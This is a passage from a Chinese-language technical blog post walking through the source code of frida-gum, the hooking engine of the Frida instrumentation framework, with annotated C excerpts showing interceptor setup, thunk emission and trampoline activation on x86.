class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">╭─muhe@muheMacBookPro ~/Code/frida ‹master*›</span><br><span class="line">╰─$ l</span><br><span class="line">total 137608</span><br><span class="line">drwxr-xr-x  29 muhe  staff   928B Nov 13 17:22 .</span><br><span class="line">drwxr-xr-x  90 muhe  staff   2.8K Nov  5 16:44 ..</span><br><span class="line">drwxr-xr-x  15 muhe  staff   480B Nov 15 18:23 .git</span><br><span class="line">-rw-r--r--   1 muhe  staff   383B Jan 21  2019 .gitignore</span><br><span class="line">-rw-r--r--   1 muhe  staff   886B Jan 21  2019 .gitmodules</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Nov 13 17:22 .vscode</span><br><span class="line">-rw-r--r--   1 muhe  staff   2.4K Jan 21  2019 COPYING</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.2K Nov  7 18:11 Makefile</span><br><span class="line">-rw-r--r--   1 muhe  staff    28K Nov  7 18:11 Makefile.linux.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    28K Nov  7 18:11 Makefile.macos.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    21K Nov  7 18:11 Makefile.sdk.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff    84K Apr 29  2019 Makefile.toolchain.mk</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.7K Nov  7 18:11 README.md</span><br><span class="line">drwxr-xr-x  10 muhe  staff   320B Nov 11 14:59 build</span><br><span class="line">drwxr-xr-x  61 muhe  staff   1.9K Jan 21  2019 capstone</span><br><span class="line">-rw-r--r--   1 muhe  staff   1.0K Nov  7 18:11 config.mk</span><br><span class="line">drwxr-xr-x   9 muhe  staff   288B Jan 21  2019 frida-clr</span><br><span class="line">drwxr-xr-x  21 muhe  staff   672B Jan 21  2019 frida-core</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Nov 11 17:37 frida-gum</span><br><span class="line">drwxr-xr-x  15 muhe  staff   480B Jan 21  2019 frida-node</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Jan 21  2019 frida-python</span><br><span class="line">drwxr-xr-x  27 muhe  staff   864B Jan 21  2019 frida-qml</span><br><span class="line">drwxr-xr-x  10 muhe  staff   320B Jan 21  2019 frida-swift</span><br><span class="line">drwxr-xr-x  12 muhe  staff   384B Jan 21  2019 frida-tools</span><br><span class="line">-rw-r--r--   1 muhe  staff    25K Nov  7 18:11 frida.sln</span><br><span class="line">-rw-r--r--   1 muhe  staff   9.0K Nov 11 14:43 frida.srctrlbm</span><br><span class="line">-rw-r--r--   1 muhe  staff    67M Nov 11 14:43 frida.srctrldb</span><br><span class="line">-rw-r--r--   1 muhe  staff   6.1K Nov 11 14:35 frida.srctrlprj</span><br><span class="line">drwxr-xr-x  47 muhe  staff   1.5K Nov  7 18:11 releng</span><br></pre></td></tr></table></figure><p><code>frida-gum</code>是底层hook框架，跨平台；</p><p><code>frida-python</code> , <code>frida-node</code>啥的是 bindings，暂时不管，不理解原理看也看不懂；</p><p><code>capstone</code> 牛逼的反汇编框架，<code>frida-gum</code>中用到了，用于指令的读；</p><p><code>releng</code> 编译相关的；</p><p><code>frida-core</code>  server/agent相关；</p><p><code>frida-tools</code> 一些工具，比如frida-ps啥的。</p><p>重点是<code>frida-gum</code> ，这是理解这个框架的基础。</p><h2 id="0x02-阅读frida-gum-x86为例"><a href="#0x02-阅读frida-gum-x86为例" class="headerlink" title="0x02 : 阅读frida-gum (x86为例)"></a>0x02 : 阅读<code>frida-gum</code> (x86为例)</h2><p><code>frida-gum</code> 注释并不多，甚至可以说几乎没，好在他代码写得好，构架合理代码规范好，所以阅读起来多读几遍，总会看懂的。</p><h3 id="2-1-构架"><a href="#2-1-构架" class="headerlink" title="2.1. 构架"></a>2.1. 构架</h3><p>这个的框架的构架如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">total 200</span><br><span class="line">drwxr-xr-x  20 muhe  staff   640B Nov 11 17:37 .</span><br><span class="line">drwxr-xr-x  29 muhe  staff   928B Nov 13 17:22 ..</span><br><span class="line">-rw-r--r--   1 muhe  staff    34B Jan 21  2019 .git</span><br><span class="line">-rw-r--r--   1 muhe  staff    70B Jan 21  2019 .gitignore</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Nov 11 17:37 .vscode</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.6K Jan 21  2019 COPYING</span><br><span class="line">drwxr-xr-x   5 muhe  staff   160B Jan 21  2019 bindings</span><br><span class="line">-rw-r--r--   1 muhe  staff   2.1K Jan 21  2019 config.h.in</span><br><span class="line">drwxr-xr-x   3 muhe  staff    96B Jan 21  2019 ext</span><br><span class="line">drwxr-xr-x  85 muhe  staff   2.7K Jan 21  2019 gum</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.1K Jan 21  2019 gum-32.vcxproj</span><br><span class="line">-rw-r--r--   1 muhe  staff    16K Jan 21  2019 gum-32.vcxproj.filters</span><br><span class="line">-rw-r--r--   1 muhe  staff   5.1K Jan 21  2019 gum-64.vcxproj</span><br><span class="line">-rw-r--r--   1 muhe  staff    16K Jan 21  2019 gum-64.vcxproj.filters</span><br><span class="line">-rw-r--r--   1 muhe  staff   8.5K Jan 21  2019 gum-common.props</span><br><span class="line">drwxr-xr-x   4 muhe  staff   128B Jan 21  2019 libs</span><br><span class="line">-rw-r--r--   1 muhe  staff   6.8K Jan 21  2019 meson.build</span><br><span class="line">-rw-r--r--   1 muhe  staff   190B Jan 21  2019 meson_options.txt</span><br><span class="line">drwxr-xr-x  28 muhe  staff   896B Jan 21  2019 tests</span><br><span class="line">drwxr-xr-x   7 muhe  staff   224B Jan 21  2019 vapi</span><br></pre></td></tr></table></figure><p>核心是在gum目录下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">gum</span><br><span class="line">├── arch-arm</span><br><span class="line">├── arch-arm64</span><br><span class="line">├── arch-mips</span><br><span class="line">├── arch-x86</span><br><span class="line">├── backend-arm</span><br><span class="line">├── backend-arm64</span><br><span class="line">├── backend-darwin</span><br><span class="line">├── backend-dbghelp</span><br><span class="line">├── backend-elf</span><br><span class="line">├── backend-libdwarf</span><br><span class="line">├── backend-libunwind</span><br><span class="line">├── backend-linux</span><br><span class="line">├── backend-mips</span><br><span class="line">├── backend-posix</span><br><span class="line">├── backend-qnx</span><br><span class="line">├── backend-windows</span><br><span class="line">└── backend-x86</span><br><span class="line">....&#x2F;&#x2F; gum下其他文件</span><br></pre></td></tr></table></figure><p>这里有必要说一下，<code>frida-gum</code> 为了实现跨平台，抽象出来 <code>构架无关/平台无关/系统无关</code>的api，比如一些内存操作，在<code>frida-gum</code>里可能就是<code>gum_xxxxx</code>，但是根据不同平台，调用到对应平台的api里去，正是做了很好的封装，上层代码才会看起来“平台无关”。</p><p>还有几个核心的对象，后面的代码里频繁提及：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GumInterceptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  GObject parent;</span><br><span class="line"></span><br><span class="line">  GRecMutex mutex;</span><br><span class="line"></span><br><span class="line">  GHashTable * function_by_address;</span><br><span class="line"></span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line">  GumCodeAllocator allocator;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">volatile</span> guint selected_thread_id;</span><br><span class="line"></span><br><span class="line">  GumInterceptorTransaction current_transaction;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从这个拦截器类索引出去的对象都需要好好注意，比如 <code>GumInterceptorBackend</code> , 最好可以生成一个uml图，阅读代码的时候对比着看。</p><h3 id="2-2-代码阅读"><a href="#2-2-代码阅读" class="headerlink" title="2.2. 代码阅读"></a>2.2. 代码阅读</h3><h4 id="2-2-1-准备工作"><a href="#2-2-1-准备工作" class="headerlink" title="2.2.1 准备工作"></a>2.2.1 准备工作</h4><p>面对比较大的代码，重要的是找到一个入口，从这个点开始读，我这里大概看了下单元测试的代码，发现基本是: 初始化，测试各种功能，清理，退出。</p><p>那么我的阅读思路就是 : </p><ol><li>初始化部分</li><li>各种功能，比如 内存模块，指令读写模块，代码修复模块</li><li>清理 这部分大概过一下就行</li></ol><p>这里我参考了 <code>jmpews</code>师傅的关于设计hook框架的文章，了解一个hook框架如何设计，分哪些模块，在阅读代码的时候能够有针对性一些。</p><ul><li>内存分配 模块 </li><li>指令写 模块 </li><li>指令读 模块 </li><li>指令修复 模块 relocator </li><li>跳板 模块 </li><li>调度器 模块 enter_thunk部分实现 </li><li>栈 模块</li></ul><p>具体可以参考他的文章: <a href="https://bbs.pediy.com/thread-220794.htm">如何构建一款像 frida 一样的框架</a></p><h4 id="2-2-2-hook从0到1"><a href="#2-2-2-hook从0到1" class="headerlink" title="2.2.2 hook从0到1"></a>2.2.2 hook从0到1</h4><p>阅读顺序根据单元测试<code>gum-test.c</code>确定的，具体的可以看代码</p><h5 id="gum-interceptor-obtain"><a href="#gum-interceptor-obtain" class="headerlink" title="gum_interceptor_obtain()"></a>gum_interceptor_obtain()</h5><p>这部分是 拦截器初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化 interceptor 对象初始化</span></span><br><span class="line">GumInterceptor *</span><br><span class="line">gum_interceptor_obtain (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  GumInterceptor * interceptor;</span><br><span class="line"></span><br><span class="line">  g_mutex_lock (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_the_interceptor != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    interceptor = GUM_INTERCEPTOR (g_object_ref (_the_interceptor));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _the_interceptor = g_object_new (GUM_TYPE_INTERCEPTOR, <span class="literal">NULL</span>);</span><br><span class="line">    g_object_weak_ref (G_OBJECT (_the_interceptor),</span><br><span class="line">        the_interceptor_weak_notify, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    interceptor = _the_interceptor;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  g_mutex_unlock (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> interceptor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_init (GumInterceptor * self)</span><br><span class="line">&#123;</span><br><span class="line">  g_rec_mutex_init (&amp;self-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  self-&gt;function_by_address = g_hash_table_new_full (<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">      (GDestroyNotify) gum_function_context_destroy);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分配器初始化</span></span><br><span class="line">  gum_code_allocator_init (&amp;self-&gt;allocator, GUM_INTERCEPTOR_CODE_SLICE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建拦截器后端</span></span><br><span class="line">  self-&gt;backend = _gum_interceptor_backend_create (&amp;self-&gt;allocator);</span><br><span class="line"></span><br><span class="line">  gum_interceptor_transaction_init (&amp;self-&gt;current_transaction, self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为GObject的使用，<code>gum_interceptor_init</code> 这个构造函数，在 <code>interceptor</code>对象创建出来的时候触发。</p><p>重点看拦截器后端的初始化</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">GumInterceptorBackend *</span><br><span class="line">_gum_interceptor_backend_create (GumCodeAllocator * allocator)</span><br><span class="line">&#123;</span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line"></span><br><span class="line">  backend = g_slice_new (GumInterceptorBackend);</span><br><span class="line">  backend-&gt;allocator = allocator;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化 codewriter和relocator</span></span><br><span class="line">  gum_x86_writer_init (&amp;backend-&gt;writer, <span class="literal">NULL</span>);</span><br><span class="line">  gum_x86_relocator_init (&amp;backend-&gt;relocator, <span class="literal">NULL</span>, &amp;backend-&gt;writer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建 thunk</span></span><br><span class="line">  gum_interceptor_backend_create_thunks (backend);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> backend;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里初始化的<code>writer</code>和<code>relocator</code>分别用于指令写和指令恢复。</p><p><code>thunks</code>的初始化，这两个是用于调度执行，分别对应 进入hook和离开hook。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_backend_create_thunks (GumInterceptorBackend * self)</span><br><span class="line">&#123;</span><br><span class="line">  GumX86Writer * cw = &amp;self-&gt;writer;</span><br><span class="line"></span><br><span class="line">  self-&gt;enter_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator);</span><br><span class="line">  gum_x86_writer_reset (cw, self-&gt;enter_thunk-&gt;data);</span><br><span class="line">  gum_emit_enter_thunk (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;enter_thunk-&gt;size);</span><br><span class="line"></span><br><span class="line">  self-&gt;leave_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator);</span><br><span class="line">  gum_x86_writer_reset (cw, self-&gt;leave_thunk-&gt;data);</span><br><span class="line">  gum_emit_leave_thunk (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;leave_thunk-&gt;size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为原理类似，只举例<code>enter_thunk</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_emit_enter_thunk (GumX86Writer * cw)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> gssize return_address_stack_displacement = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// save ret addr</span></span><br><span class="line">  gum_emit_prolog (cw, return_address_stack_displacement);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构造自己的函数栈</span></span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XSI,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_CPU_CONTEXT);</span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XDX,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_TOP);</span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XCX,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_NEXT_HOP);</span><br><span class="line"></span><br><span class="line">  gum_x86_writer_put_call_address_with_aligned_arguments (cw, GUM_CALL_CAPI,</span><br><span class="line">      GUM_ADDRESS (_gum_function_context_begin_invocation), <span class="number">4</span>,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XBX,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XSI,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XDX,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XCX);</span><br><span class="line"></span><br><span class="line">  gum_emit_epilog (cw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="gum-interceptor-attach-listener"><a href="#gum-interceptor-attach-listener" class="headerlink" title="gum_interceptor_attach_listener"></a>gum_interceptor_attach_listener</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach_listener (GumInterceptor * self,</span><br><span class="line">                                 gpointer function_address,</span><br><span class="line">                                 GumInvocationListener * listener,</span><br><span class="line">                                 gpointer listener_function_data)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="gum-interceptor-transaction-begin"><a href="#gum-interceptor-transaction-begin" class="headerlink" title="gum_interceptor_transaction_begin"></a>gum_interceptor_transaction_begin</h6><h6 id="gum-interceptor-instrument-✨"><a href="#gum-interceptor-instrument-✨" class="headerlink" title="gum_interceptor_instrument ✨"></a>gum_interceptor_instrument ✨</h6><p>这里要说的是 function_address 就是要hook的目标函数，<code>frida-gum</code>把要hook的目标封装成了 <code>GumFunctionContext</code>对象，方便操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function_address = gum_interceptor_resolve (self, function_address); <span class="comment">// ?</span></span><br><span class="line">  <span class="comment">// 创建跳板</span></span><br><span class="line">  function_ctx = gum_interceptor_instrument (self, function_address);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> GumFunctionContext *</span><br><span class="line">gum_interceptor_instrument (GumInterceptor * self,</span><br><span class="line">                            gpointer function_address)</span><br><span class="line">&#123;</span><br><span class="line">  GumFunctionContext * ctx;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 要hook的函数，封装成了 GumFunctionContext，此时</span></span><br><span class="line">  <span class="comment">// 根据 地址，得到与之对应的 GunFunctionContext对象</span></span><br><span class="line">  ctx = (GumFunctionContext *) g_hash_table_lookup (self-&gt;function_by_address,</span><br><span class="line">      function_address);</span><br><span class="line">  <span class="keyword">if</span> (ctx != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">  <span class="comment">// 如果获取到的是空的对象，必须初始化了才能使用</span></span><br><span class="line">  <span class="comment">// 只写几个字断，分配内存/hook的函数地址/interceptor成员</span></span><br><span class="line">  ctx = gum_function_context_new (self, function_address);</span><br><span class="line">  <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">// 创建跳板</span></span><br><span class="line">  <span class="keyword">if</span> (!_gum_interceptor_backend_create_trampoline (self-&gt;backend, ctx))</span><br><span class="line">  &#123;</span><br><span class="line">    gum_function_context_finalize (ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置完成后， 添加到哈希表</span></span><br><span class="line">  <span class="comment">// hash_table, key, value</span></span><br><span class="line">  <span class="comment">// hook函数地址，GumFunctionContext对象对应， 方便查找</span></span><br><span class="line">  g_hash_table_insert (self-&gt;function_by_address, function_address, ctx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当前 transaction 添加到 任务中， 设置回调 函数 gum_interceptor_activate 拦截器激活函数</span></span><br><span class="line">  gum_interceptor_transaction_schedule_prologue_write (</span><br><span class="line">      &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ctx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里贴一下跳板代码方便理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">00C30200  mov         al,byte ptr ds:[FF00C121h]  </span><br><span class="line">00C30205  xor         eax,0C30200h  </span><br><span class="line">00C3020A  jmp         00C30000   &#x2F;&#x2F; 跳到上面的 enter_thunk</span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  &#x2F;&#x2F; 跳到 leave_thunk</span><br><span class="line">&#x2F;&#x2F; 原函数修复的指令，7个字节</span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h) &#x2F;&#x2F; 跳回原函数，因为写跳转用了7字节，所以+7</span><br></pre></td></tr></table></figure><h6 id="gum-interceptor-transaction-end"><a href="#gum-interceptor-transaction-end" class="headerlink" title="gum_interceptor_transaction_end"></a>gum_interceptor_transaction_end</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当前 transaction 添加到 任务中， 设置回调 函数 gum_interceptor_activate 拦截器激活函数</span></span><br><span class="line">  gum_interceptor_transaction_schedule_prologue_write (</span><br><span class="line">      &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate);</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 拦截器激活</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_activate (GumInterceptor * self,</span><br><span class="line">                          GumFunctionContext * ctx,</span><br><span class="line">                          gpointer prologue)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ctx-&gt;destroyed)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  g_assert (!ctx-&gt;activated);</span><br><span class="line">  ctx-&gt;activated = TRUE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 激活</span></span><br><span class="line">  _gum_interceptor_backend_activate_trampoline (self-&gt;backend, ctx,</span><br><span class="line">      prologue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">_gum_interceptor_backend_activate_trampoline (GumInterceptorBackend * self,</span><br><span class="line">                                              GumFunctionContext * ctx,</span><br><span class="line">                                              gpointer prologue)</span><br><span class="line">&#123;</span><br><span class="line">  GumX86Writer * cw = &amp;self-&gt;writer;</span><br><span class="line">  guint padding;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置base</span></span><br><span class="line">  gum_x86_writer_reset (cw, prologue);</span><br><span class="line">  <span class="comment">// 设置pc</span></span><br><span class="line">  cw-&gt;pc = GPOINTER_TO_SIZE (ctx-&gt;function_address);</span><br><span class="line">  <span class="comment">// 写jmp， 跳转到 跳板中， 进入跳板这已经到hook里了</span></span><br><span class="line">  gum_x86_writer_put_jmp_address (cw, GUM_ADDRESS (ctx-&gt;on_enter_trampoline));</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpint (gum_x86_writer_offset (cw),</span><br><span class="line">      &lt;=, GUM_INTERCEPTOR_REDIRECT_CODE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 原本代码（hook点），剩余的地方nop补齐</span></span><br><span class="line">  padding = ctx-&gt;overwritten_prologue_len - gum_x86_writer_offset (cw);</span><br><span class="line">  <span class="keyword">for</span> (; padding != <span class="number">0</span>; padding--)</span><br><span class="line">    gum_x86_writer_put_nop (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-3-执行流程"><a href="#2-2-3-执行流程" class="headerlink" title="2.2.3 执行流程"></a>2.2.3 